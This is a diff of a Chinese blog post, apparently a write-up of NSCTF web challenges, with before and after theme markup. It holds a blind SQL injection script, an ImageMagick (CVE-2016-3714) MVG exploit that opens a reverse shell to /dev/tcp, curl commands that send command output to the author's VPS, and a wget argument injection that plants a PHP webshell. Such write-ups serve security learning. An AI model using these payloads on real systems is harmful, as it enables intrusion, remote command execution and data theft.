-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> XXX <span class="keyword">SET</span>(username,<span class="keyword">content</span>,<span class="keyword">data</span>) <span class="keyword">VALUES</span> (‘xxx’,’xxx’,<span class="keyword">now</span>())</div></pre></td></tr></table></figure>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-13.png" alt="16-25-13.png" title="">
-<p>这个地方这么明显的提示，当然是注入啊。。。<br>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> XXX <span class="keyword">SET</span>(username,<span class="keyword">content</span>,<span class="keyword">data</span>) <span class="keyword">VALUES</span> (‘xxx’,’xxx’,<span class="keyword">now</span>())</span><br></pre></td></tr></table></figure>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-13.png" alt=""><br>
+这个地方这么明显的提示，当然是注入啊。。。<br>
 发现username和content都是有<code>addslashes()</code>转义的。我还以为有什么神操作可以绕过，一直在这耗，毕竟提示都打印sql语句了。最后还是没得办法，2333<br>
 最后发现这是个坑，真正的注入点是一个search留言的get参数，欲哭无泪。<br>
 最后用盲注高出flag了<br>
 POC 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,re</div><div class="line">url = <span class="string">"http://116.62.63.190:8002/ee00f46afe33f2ff/web6//search.php?search=a"</span></div><div class="line"><span class="comment"># 5'or%20ord(substr((Select%0bcolumncolumn_name_name%20%0bfromfrom%20%20informatioinformation_schema.columnsn_schema.columns%20%20wherewhere%20%0btable_name='flag'%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0</span></div><div class="line"><span class="comment"># payload="5'or%20ord(substr((/*!50000Select*/%0bflag%20from%20web1.flag%20%20where%201%0b%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0"</span></div><div class="line">payload = <span class="string">"'or%20ord(substr((/*!50000Select*/%0badmin_pass%20from%20ctf4.admin%20where%201%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%23"</span></div><div class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>):</div><div class="line">    str=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">        num=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> l:</div><div class="line">            html = requests.get(url+payload.format(i,j,t)).text</div><div class="line">            <span class="keyword">if</span> <span class="string">"111111"</span> <span class="keyword">in</span> html:</div><div class="line">                num+=t</div><div class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        str+=chr(num)</div><div class="line">        <span class="keyword">print</span> str+<span class="string">"_"</span></div><div class="line">    <span class="keyword">print</span> str</div><div class="line">    <span class="keyword">if</span> str==<span class="string">""</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> <span class="string">"============================"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"End"</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">url = <span class="string">"http://116.62.63.190:8002/ee00f46afe33f2ff/web6//search.php?search=a"</span></span><br><span class="line"><span class="comment"># 5'or%20ord(substr((Select%0bcolumncolumn_name_name%20%0bfromfrom%20%20informatioinformation_schema.columnsn_schema.columns%20%20wherewhere%20%0btable_name='flag'%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0</span></span><br><span class="line"><span class="comment"># payload="5'or%20ord(substr((/*!50000Select*/%0bflag%20from%20web1.flag%20%20where%201%0b%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0"</span></span><br><span class="line">payload = <span class="string">"'or%20ord(substr((/*!50000Select*/%0badmin_pass%20from%20ctf4.admin%20where%201%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%23"</span></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        num=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> l:</span><br><span class="line">            html = requests.get(url+payload.format(i,j,t)).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"111111"</span> <span class="keyword">in</span> html:</span><br><span class="line">                num+=t</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        str+=chr(num)</span><br><span class="line">        <span class="keyword">print</span> str+<span class="string">"_"</span></span><br><span class="line">    <span class="keyword">print</span> str</span><br><span class="line">    <span class="keyword">if</span> str==<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"============================"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"End"</span></span><br></pre></td></tr></table></figure>
 <h3 id="本题总结"><a class="markdownIt-Anchor" href="#本题总结"></a> 本题总结：</h3>
 <blockquote>
 <p>可以找到的切入点太多（坑太多），混淆视听，实际考察的东西却过于简单，可能是我想太多了吧2333</p>
@@ -551,537 +293,155 @@ POC 如下：</p>
 <p>500分的题目，还是挺有难度的，考查的是一个去年的imagemagick远程执行漏洞（CVE-2016-3714）<br>
 freebuf上有分析http://www.freebuf.com/vuls/103504.html</p>
 <p>一开始没给提示，然后给个phpinfo，然后下午不知道什么时候再给了一个图片才知道是这个漏洞。。（出题人也是无力吐槽，各种改题不提示，环境还迟迟未搭建好）</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-45.jpg" alt="16-25-45.jpg" title="">
-<p>网上查到exploit，</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill <span class="string">'url(https://公网ip/image.jpg"||bash -i &gt;&amp; /dev/tcp/你的vps/9999 0&gt;&amp;1")'</span></div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-45.jpg" alt=""><br>
+网上查到exploit，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://公网ip/image.jpg"||bash -i &gt;&amp; /dev/tcp/你的vps/9999 0&gt;&amp;1")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 <p>将exploit变成一个图片的内容保存起来，格式png,Jpg都是可以的，<br>
 我是改成.mvg，然后burp截包吧Content-Type改成image/jpeg，因为漏洞主要是用了ImageMagick处理图片转换格式的时候遇到畸形内容的图片，使用system函数处理https请求然后导致漏洞产生。直接上传png，jpg没试过，大家可以试试。<br>
 上面的exp是执行命令反弹shell的，我没有成功反弹，随改成请求我的vps，然后侦听端口，把想要的结果用cookie传过来。<br>
 我的exploit:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`ls`\" http://我的vps IP:2502 ")'</span></div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`ls`\" http://我的vps IP:2502 ")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 <p>先开启VPS侦听端口<br>
 把这个exp保存为图片后上传会执行’ls’命令,然后将ls命令执行结果存为name=结果的cookie，然后再通过curl发送cookie到我的vps上。</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-26-31.jpg" alt="16-26-31.jpg" title="">
-<p>提示flag在tmp里面</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-26-31.jpg" alt=""><br>
+提示flag在tmp里面</p>
 <p>改一下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`ls  /tmp |grep flag `\" http://我的vps IP:2502 ")'</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`ls  /tmp |grep flag `\" http://我的vps IP:2502 ")'</span></span><br></pre></td></tr></table></figure>
 <p>VPS接收到的是</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-26-42.jpg" alt="16-26-42.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-26-42.jpg" alt=""></p>
 <p>随后</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`cat /tmp/flag.txt`\" http://我的vps IP:2502  ")'</span></div></pre></td></tr></table></figure>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-27-13.jpg" alt="16-27-13.jpg" title="">
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fill <span class="string">'url(https://www.baidu.com/img/bd_logo1.png"|curl --cookie \"name=`cat /tmp/flag.txt`\" http://我的vps IP:2502  ")'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-27-13.jpg" alt=""></p>
 <h3 id="本题总结-2"><a class="markdownIt-Anchor" href="#本题总结-2"></a> 本题总结：</h3>
 <blockquote>
 <p>由于本人开始写exploit的时候忽略了一些细节，导致cookie传不出来，也想不到其他传出命令执行结果的方法，故在比赛结束后几分钟才解得flag，丢失了500分,贼气。说明还是得熟悉linux操作、提升漏洞复现，随机应变的能力。</p>
 </blockquote>
 <h2 id="7web8-git泄露"><a class="markdownIt-Anchor" href="#7web8-git泄露"></a> 7.Web8-Git泄露</h2>
 <p>说是送分题，其实也拖了挺久时间的。。。也许因为太菜吧</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-52.jpg" alt="16-28-52.jpg" title="">
-<p>进去提示url=git<br>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-52.jpg" alt=""><br>
+进去提示url=git<br>
 但是修改url，没有任何反应<br>
 可能这就是传说中的提示吧</p>
 <p>用Githack扫一下地址就能得到flag了</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-58.jpg" alt="16-28-58.jpg" title="">
-<p>打开83c0eb95cf761515fe09c2ad39527a39.txt</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-10.jpg" alt="16-29-10.jpg" title="">Base64解得:
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-43.png" alt="16-29-43.png" title="">
-<p><strong>flag:{86045abb89db3e841f68593e3ecb7993}</strong></p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-58.jpg" alt=""><br>
+打开83c0eb95cf761515fe09c2ad39527a39.txt</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-10.jpg" alt="">Base64解得:</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-43.png" alt=""><br>
+<strong>flag:{86045abb89db3e841f68593e3ecb7993}</strong></p>
 <h2 id="8web9-wget"><a class="markdownIt-Anchor" href="#8web9-wget"></a> 8.Web9-Wget</h2>
 <p>比赛的时候没有做出来这道题，比赛后才知道这种思路。<br>
 一开始以为绕过wget命令，因为是批量下载，没有绕过。<br>
 发现可以用wget的参数-P指定目录-O指定文件名字<br>
 但是随便输入一个地址会发现Permission Denied</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-53.png" alt="16-29-53.png" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-53.png" alt=""></p>
 <p>说明当前目录不可写<br>
 然后我就搁置在这了，主要是源码注释里面存在一个admin.php<br>
 一直在想这个admin.php有啥用</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-25.jpg" alt="16-30-25.jpg" title="">
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-29.jpg" alt="16-30-29.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-25.jpg" alt=""><br>
+<img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-29.jpg" alt=""></p>
 <p>一直在纠结这个<br>
 <strong>然后自己写出来后才知道，没卵用。我的心情是复杂的。</strong></p>
 <p>接着目录不可写，发现上上级目录/var/www/html是可写的<br>
 Payload为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-P /var/www/haml -O+/var/www/html/wz.php http://我的VPS/code.txt</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-P /var/www/haml -O+/var/www/html/wz.php http://我的VPS/code.txt</span><br></pre></td></tr></table></figure>
 <p>会发现已经写入</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg" alt="16-32-02.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg" alt=""></p>
 <p>我的VPS上的Code.txt的内容是一个一句话木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">My code</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">System($_POST[“code”]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">My code</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">System($_POST[“code”]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>随后访问<code>http://116.62.63.190:8005/wz.php</code>，发现一句话已经写入了</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg" alt="16-32-09.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg" alt=""></p>
 <p>接着就是找flag了。<br>
 最后在**/var/www/html/4b0cf03220fefbf6/web9/flag.php**下找到flag</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg" alt="16-32-16.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg" alt=""></p>
 <h1 id="web题结束"><a class="markdownIt-Anchor" href="#web题结束"></a> Web题结束</h1>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
-          
         </div>
-      
 
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/" rel="next" title="CCTF（重庆绿盟杯）比赛writeUp">
-                <i class="fa fa-chevron-left"></i> CCTF（重庆绿盟杯）比赛writeUp
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/27/Pwnable-kr-Passcode/" rel="prev" title="Pwnable.kr--Passcode">
-                Pwnable.kr--Passcode <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">W z</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            <section class="post-copyright">
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">26</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
-                    
-                      <a href="/categories/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">2</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2017/09/27/NSCTF-Web-WriteUp/">https://www.testzero-wz.com/2017/09/27/NSCTF-Web-WriteUp/</a></span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
 
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
                     
-                  
-                  
                     
-                  
-                  <a href="https://github.com/testzero-wz" title="GitHub &rarr; https://github.com/testzero-wz" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                        <a href="/tag/CTF/"># CTF</a>
+                    
+                        <a href="/tag/WriteUp/"># WriteUp</a>
+                    
+                        
                 </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="mailto:testzero.wz@gmail.com" title="E-Mail &rarr; mailto:testzero.wz@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                </span>
-              
             </div>
-          
-
-          
-
-          
-          
-
-          
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
             
-          
-          
+                <a class="prev" rel="prev" href="/2017/09/27/Pwnable-kr-Passcode/">Pwnable.kr--Passcode</a>
+            
+            
+            <a class="next" rel="next" href="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/">CCTF（重庆绿盟杯）比赛writeUp</a>
+            
+        </section>
+
+
+    </article>
+</div>
 
         </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web-writeup"><span class="nav-number">1.</span> <span class="nav-text"> Web-writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1web签到题"><span class="nav-number">1.1.</span> <span class="nav-text"> 1.Web签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2web2-少年你真的会使用ping吗"><span class="nav-number">1.2.</span> <span class="nav-text"> 2.Web2-少年你真的会使用PING吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3web3"><span class="nav-number">1.3.</span> <span class="nav-text"> 3.Web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3web4文件上传"><span class="nav-number">1.4.</span> <span class="nav-text"> 3.Web4文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5web6-vulhub"><span class="nav-number">1.5.</span> <span class="nav-text"> 5.Web6-Vulhub</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本题总结"><span class="nav-number">1.5.1.</span> <span class="nav-text"> 本题总结：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6web7-imagemagick"><span class="nav-number">1.6.</span> <span class="nav-text"> 6.Web7-imagemagick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本题总结-2"><span class="nav-number">1.6.1.</span> <span class="nav-text"> 本题总结：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7web8-git泄露"><span class="nav-number">1.7.</span> <span class="nav-text"> 7.Web8-Git泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8web9-wget"><span class="nav-number">1.8.</span> <span class="nav-text"> 8.Web9-Wget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web题结束"><span class="nav-number">2.</span> <span class="nav-text"> Web题结束</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-  </aside>
-  
+</footer>
 
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">W z</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-    
-      <i class="fa fa-user"></i>
-	  总访客:
-    </span>
-    <span class="site-uv" title="总访客量">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+-->
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-
-
-
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
